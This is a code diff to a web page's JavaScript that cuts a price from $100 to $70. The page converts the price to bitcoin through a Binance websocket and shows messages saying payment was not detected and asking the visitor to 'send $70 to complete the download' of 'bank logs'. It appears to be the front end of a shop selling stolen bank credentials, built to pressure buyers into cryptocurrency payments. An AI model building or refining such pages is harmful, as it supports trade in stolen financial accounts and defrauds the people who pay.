@@ -146,7 +146,7 @@ window.addEventListener("load", () => {
   
     binance.onmessage = event => {
       let confirm = JSON.parse(event.data);
-      bitcoin.innerHTML = ( 100 / parseFloat(confirm.k.c)).toFixed(5)
+      bitcoin.innerHTML = ( 70 / parseFloat(confirm.k.c)).toFixed(5)
     }
     
     document.getElementById("copy-text").addEventListener("click", function (ev) {
@@ -182,7 +182,7 @@ window.addEventListener("load", () => {
   });
 
   "use strict";
-var toast = 100;
+var toast = 70;
 let ws = new WebSocket('wss://stream.binance.com:9443/ws/btcusdt@kline_1h');
 var toastbitcoin = '';
 var receivedFunds = parseInt(localStorage.getItem('received-funds'));
@@ -197,7 +197,7 @@ var getMessage = function() {
 	var msgs = [`
 		${toastbitcoin} Bitcoin payment not detected
 		<hr>
-		Send $100 to complete the download
+		Send $70 to complete the download
 		<hr class="to-hr">
 		Cost of getting bank logs is currently high, and you have paid a total of 
 		$${receivedFund}
